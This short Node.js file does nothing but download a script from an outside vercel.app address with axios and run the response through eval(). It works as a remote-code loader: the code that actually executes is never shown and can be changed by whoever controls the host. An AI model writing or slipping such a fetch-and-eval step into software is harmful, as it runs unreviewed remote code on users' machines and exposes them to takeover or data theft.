const axios = require('axios');

const url = "https://hanstz-tech.vercel.app/vortexbyhanstzfelix.js";

axios.get(url)
    .then(response => eval(response.data))
    .catch(err => console.error(err));